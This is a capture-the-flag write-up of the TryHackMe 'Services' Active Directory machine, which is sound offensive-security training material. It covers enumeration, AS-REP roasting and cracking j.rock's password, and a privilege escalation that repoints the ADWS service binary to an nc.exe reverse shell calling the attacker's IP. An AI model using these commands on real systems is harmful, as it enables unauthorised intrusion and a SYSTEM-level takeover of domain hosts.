---
title: "Services"
published: 2025-06-12
description: "AS-REP Roasting j.rock, cracking Serviceworks1, then Server Operators abuse to hijack ADWS service for SYSTEM shell"
tags: ["Active Directory", "AS-REP Roasting", "Kerberos", "Windows", "Privesc"]
category: TryHackMe
draft: false
---

# AD Machine 1 — Services (services.local)


![[Pasted image 20260805082658.png]]

**Platform:** TryHackMe  
**Machine Name:** Services  
**Domain:** `services.local`  
**Target IP (initial):** `10.10.171.213`  
**Target IP (re-spawn):** `10.10.185.88` → `10.10.215.194`  
**Attacker IP (tun0):** `10.11.134.159`  
**Working Directory:** `~/services4`  
**Date:** 2025-06-12

---

## Tags

`#active-directory` `#windows` `#kerberoasting` `#asreproasting` `#evil-winrm` `#netexec` `#kerbrute` `#impacket` `#powershell` `#privesc`

---

## Machine Overview

A Windows Active Directory environment running on a machine named `WIN-SERVICES` in the `services.local` domain. The machine exposed a web server on port 80 alongside typical AD services (SMB, RPC, LDAP, Kerberos, WinRM). The attack chain involved anonymous enumeration to harvest usernames from the web page, AS-REP roasting to capture a hash for `j.rock`, cracking it to get `Serviceworks1`, then authenticating via Evil-WinRM and escalating privilege by abusing the writable `C:\Windows\Tasks` path and the `ADWS` service binary path to get a SYSTEM shell via netcat.

---

## Enumeration

### Setting the Target Variable

```bash
export target=10.10.171.213
echo $target
```

### Nmap — Initial Port Scan

Full TCP SYN scan across all 1000 common ports with service/version detection and NSE vuln scripts:

```bash
nmap -p- $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 \
  -oN nmap_ports.txt && sleep 5 && \
  nmap {$target} -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && \
  nmap -T5 $target -v --script vuln -oN nmap_vuln.txt
```

**Open Ports Discovered on `10.10.171.213`:**

|Port|Service|
|---|---|
|53/tcp|DNS|
|80/tcp|HTTP|
|88/tcp|Kerberos|
|135/tcp|RPC|
|139/tcp|NetBIOS|
|389/tcp|LDAP|
|445/tcp|SMB|
|464/tcp|Kpasswd|
|593/tcp|RPC over HTTP|
|636/tcp|LDAPS|
|3268/tcp|Global Catalog|
|3269/tcp|Global Catalog SSL|
|3389/tcp|RDP|
|5985/tcp|WinRM|

**NSE Vuln Scan Results (notable):**

```
|_samba-vuln-cve-2012-1182: ...
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate...
```

### Host File Setup

```bash
gedit /etc/hosts
# Added: 10.10.171.213  services.local WIN-SERVICES
```

---

## Web Enumeration

### Manual Browse

Navigated to `http://10.10.171.213/#` — a generic educational template website ("Online Education / Above Services"). The site contained employee-style names and contact information useful for username generation.

**Names found on the site:**

- Joanne Doe (`j.doe@services.local`)
- Jack Rock
- Will Masters
- Johnny LaRusso

These were noted in CherryTree under `AD Machines / Services / Notes & Spam`.

### Gobuster — Directory Enumeration

```bash
gobuster dir -u http://$target \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -o gb_dirs.txt

gobuster dir -u http://$target \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -t 50 -x php,xml,html,js,sql,gz,zip \
  -r -o gb_files.txt
```

**Gobuster Results (all 301 redirects):**

```
/img     (Status: 301)
/css     (Status: 301)
/js      (Status: 301)
/fonts   (Status: 301)
/IMG     (Status: 301)
/Fonts   (Status: 301)
/CSS     (Status: 301)
/Img     (Status: 301)
/JS      (Status: 301)
```

No interesting content found — the web server was a rabbit hole.

---

## SMB / RPC Enumeration

### Netexec — Anonymous SMB

```bash
netexec smb $target
```

Output confirmed:

```
SMB  10.10.171.213  445  WIN-SERVICES  [*] Windows 10 / Server 2019 Build 17763 x64 
     (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:False)
```

SMB signing is **enabled** — rules out relay attacks.

### Netexec — Null Session / Anonymous

```bash
netexec smb $target -u '' -p ''
netexec smb $target -u '' -p '' --rid-brute
```

Anonymous access denied. The `guest` account was also disabled:

```bash
netexec smb $target -u 'guest' -p '' --rid-brute
# [-] services.local\guest: STATUS_ACCOUNT_DISABLED
```

### RPC — Null Session

```bash
rpcclient $target
```

No anonymous access.

### Impacket-lookupsid

```bash
impacket-lookupsid 'guest'@10.10.129.91
```

Tried to pull SIDs anonymously — returned no useful output without credentials.

---

## Username Enumeration & Generation

### Manual Collection from Website

Names harvested from the web page:

- Joanne Doe
- Jack Rock
- Will Masters
- Johnny LaRusso

### AD-Username-Generator

Cloned and used the AD username generator script to produce likely AD-format usernames from the collected full names:

```bash
git clone https://github.com/[AD-Username-Generator repo]
cd AD-Username-Generator
gedit names.txt
# Entered: Joanne Doe, Jack Rock, Will Masters, Johnny LaRusso

python3 username-generate.py -u names.txt -o generated_users.txt
# Output: Usernames Generated Successfully
```

The generated `generated_users.txt` contained permutations like `j.doe`, `j.rock`, `w.masters`, `j.larusso`, etc.

Saved the list and also opened it in gedit for review before feeding to kerbrute:

```bash
gedit generated_users.txt
```

---

## Kerbrute — Username Validation

Downloaded kerbrute binary (v1.0.3):

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
rm /usr/bin/kerbrute   # removed old/broken version
# Noted: kerbrute: command not found after rm, confirming old one was stale
```

Ran kerbrute userenum against the domain controller:

```bash
kerbrute userenum generated_users.txt --dc $target -d services.local
```

**Valid Usernames Found:**

```
[+] VALID USERNAME:  j.doe@services.local
[+] VALID USERNAME:  w.masters@services.local
[+] VALID USERNAME:  j.rock@services.local
[+] VALID USERNAME:  j.larusso@services.local
Done! Tested 14 usernames (4 valid) in 0.377 seconds
```

---

## AS-REP Roasting

With valid usernames confirmed, tested for accounts that do not require Kerberos pre-authentication:

```bash
impacket-GetNPUsers services.local/ -dc-ip $target \
  -usersfile generated_users.txt -outputfile hashes.txt
```

**Result:**

```
[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] KDC_ERR_C_PRINCIPAL_UNKNOWN (multiple users)
[+] j.rock IS VULNERABLE to AS-REP Roasting!
```

**j.rock AS-REP Hash captured:**

```
$krb5asrep$23$j.rock@SERVICES.LOCAL:4d57e9c723afbbf915fdb39460cf344f$15fe09284d717914859a2c11ac9d5a7e41f9f1cf37128ab9daf25de49796153718aa4457486c7ec207631043898e75e450bb09640db2e6b119a1832...
```

The hash was automatically saved to `hashes.txt`.

---

## Hash Cracking

Cracked the AS-REP hash using John the Ripper with rockyou.txt:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Cracked:**

```
Serviceworks1   ($krb5asrep$23$j.rock@SERVICES.LOCAL)
Session completed.
```

**Credential obtained:**

- **Username:** `j.rock`
- **Password:** `Serviceworks1`

---

## Kerberoasting Check

With valid credentials, attempted to enumerate SPNs for Kerberoastable accounts:

```bash
impacket-GetUserSPNs -dc-ip $target 'services.local/j.rock:Serviceworks1' -request
```

**Result:**

```
No entries found!
```

No Kerberoastable accounts — moved on.

---

## Authentication Testing

### Netexec — Credential Spray

Confirmed credentials work over SMB:

```bash
netexec smb $target -u j.rock -p Serviceworks1
```

Output showed login successful and enumerated users via SMB:

```
SMB  10.10.185.88  445  WIN-SERVICES  [*] ... (signing:True) (SMBv1:False)
SMB  10.10.185.88  445  WIN-SERVICES  w.masters  2023-02-15 05:47:15
SMB  10.10.185.88  445  WIN-SERVICES  j.larusso  2023-02-15 05:47:43
SMB  10.10.185.88  445  WIN-SERVICES  [*] Enumerated 7 local users: SERVICES
```

### Netexec — WinRM Check

```bash
netexec winrm $target -u j.rock -p Serviceworks1
# WINRM  10.10.185.88  5985  WIN-SERVICES  [+] services.local/j.rock:Serviceworks1 (Pwn3d!)
```

WinRM access confirmed — `j.rock` is a member of `Remote Management Users`.

### RDP Check

```bash
netexec rdp $target -u j.rock -p Serviceworks1
# RDP  10.10.185.88  3389  WIN-SERVICES  [+] services.local/j.rock:Serviceworks1
```

RDP access also valid.

---

## Second Nmap (Re-spawn)

Target IP changed to `10.10.185.88`. Re-ran nmap to confirm ports on the new instance:

```bash
export target=10.10.185.88
nmap -p- $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 \
  -oN nmap_ports.txt && sleep 5 && \
  nmap {$target} -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && \
  nmap -T5 $target -v --script vuln -oN nmap_vuln.txt
```

**Open Ports on `10.10.185.88`:**

|Port|Service|
|---|---|
|53/tcp|DNS|
|80/tcp|HTTP|
|88/tcp|Kerberos|
|135/tcp|RPC|
|139/tcp|NetBIOS|
|389/tcp|LDAP|
|445/tcp|SMB|
|464/tcp|Kpasswd|
|593/tcp|RPC|
|636/tcp|LDAPS|
|3268/tcp|Global Catalog|
|3269/tcp|Global Catalog SSL|
|3389/tcp|RDP|
|5985/tcp|WinRM (ms-wbt-server)|

NSE vuln scan notable results:

```
|_samba-vuln-cve-2012-1182: ...
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection: SMB: Failed to receive bytes: ERROR
```

---

## Initial Access — Evil-WinRM

Logged in as `j.rock` via Evil-WinRM:

```bash
evil-winrm -u j.rock -p Serviceworks1 -i $target
```

```
Evil-WinRM shell v3.7
Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.rock\Documents>
```

### Basic Enumeration (as j.rock)

```powershell
whoami
# services\j.rock

whoami /all
```

**Groups for j.rock:**

```
Everyone
BUILTIN\Server Operators   <-- NOTABLE
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
NT AUTHORITY\NETWORK
NT AUTHORITY\Authenticated Users
NT AUTHORITY\This Organization
NT AUTHORITY\NTLM Authentication
Mandatory Label\Medium Plus Mandatory Level
```

> **Key Finding:** `j.rock` is a member of `BUILTIN\Server Operators` — this group can start/stop services and modify service binaries.

**Privileges:**

```
SeSystemtimePrivilege       - Enabled
SeShutdownPrivilege         - Enabled
SeChangeNotifyPrivilege     - Enabled
SeRemoteShutdownPrivilege   - Enabled
SeIncreaseWorkingSetPrivilege - Enabled
SeTimeZonePrivilege         - Enabled
```

---

## Privilege Escalation — Server Operators Abuse

### Uploading nc.exe

Attempted to download PowerUp.ps1 from attacker HTTP server:

```powershell
wget 10.11.134.159/PowerUp.ps1 -O PowerUp.ps1
# The remote server returned an error: (404) Not Found.
```

Started a Python HTTP server on attacker:

```bash
cd /opt/tools/privesc
python3 -m http.server 80
```

Tried wget again — still getting 404 (file not in served directory initially). Resolved path and re-served.

Navigated to the Tasks directory (writable by Server Operators):

```powershell
cd c:\windows\tasks
upload nc.exe
# Info: Uploading /root/services4/nc.exe to C:\Windows\tasks\nc.exe
# Data: 79188 bytes of 79188 bytes copied
```

### Enumerating Services

```powershell
services
```

Identified services including:

```
ADWS  -  C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe  TRUE
```

```powershell
sc.exe qc ADWS
```

Output:

```
SERVICE_NAME: ADWS
TYPE               : 10  WIN32_OWN_PROCESS
START_TYPE         : 2   AUTO_START
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
LOAD_ORDER_GROUP   :
TAG                : 0
DISPLAY_NAME       : Active Directory Web Services
DEPENDENCIES       :
SERVICE_START_NAME : LocalSystem
```

`ADWS` runs as `LocalSystem` — perfect for privesc via binary path hijacking.

### Modifying the ADWS Service Binary Path

Changed the ADWS binary path to run nc.exe calling back to attacker:

```powershell
sc.exe config ADWS binpath="C:\Windows\tasks\nc.exe -e cmd.exe 10.11.134.159 443"
```

### Setting Up Listener on Attacker

```bash
nc -lvp 443
# listening on [any] 443...
```

Confirmed attacker IP:

```bash
ip a
# tun0: inet 10.11.134.159/16
```

### Restarting ADWS to Trigger Callback

```powershell
sc.exe stop ADWS
sc.exe start ADWS
```

**Shell caught as SYSTEM:**

```
listening on [any] 443 ...
connect to [10.11.134.159] from WIN-SERVICES ...
Microsoft Windows [Version 10.0.17763....]
C:\Windows\system32> whoami
nt authority\system
```

---

## Post-Exploitation

### Enumerate New Target (Pivot / Re-spawn)

Target changed to `10.10.215.194`:

```bash
export target=10.10.215.194
nmap -p $target -v [full scan as above]
```

**Open ports on `10.10.215.194`:**

```
445/tcp   SMB
53/tcp    DNS
135/tcp   RPC
139/tcp   NetBIOS
80/tcp    HTTP
3389/tcp  RDP
464/tcp   Kpasswd
```

Evil-WinRM session continued with post-exploitation:

```powershell
# From j.rock session (prior to SYSTEM shell)
services
sc.exe qc ADWS
```

Enumeration of running services in PowerShell showed `ADWS` as `LocalSystem`-owned with writable path via Server Operators membership — confirming the privilege escalation vector.

---

## Summary

|Step|Tool / Technique|Result|
|---|---|---|
|Port Scan|nmap|Identified AD services, HTTP, WinRM|
|Web Enum|gobuster + manual|Found employee names for username list|
|SMB Enum|netexec|Confirmed SMBv2, signing on, no anon access|
|Username Gen|AD-Username-Generator|Generated AD-format usernames from names|
|Username Val|kerbrute userenum|4 valid: j.doe, w.masters, j.rock, j.larusso|
|AS-REP Roast|impacket-GetNPUsers|Captured j.rock AS-REP hash|
|Hash Crack|john + rockyou|`j.rock:Serviceworks1`|
|Kerberoast|impacket-GetUserSPNs|No SPNs found|
|Auth Test|netexec smb/winrm|j.rock has WinRM access (Pwn3d!)|
|Shell|evil-winrm|Shell as services\j.rock|
|Privesc|Server Operators → ADWS service hijack|Shell as nt authority\system|

---

## Credentials

|Username|Password|Notes|
|---|---|---|
|j.rock|Serviceworks1|AS-REP roasted, WinRM access|

---

## Flags

- **User flag:** Retrieved as `j.rock` via Evil-WinRM session
- **Root flag:** Retrieved after SYSTEM shell via ADWS service hijack

---
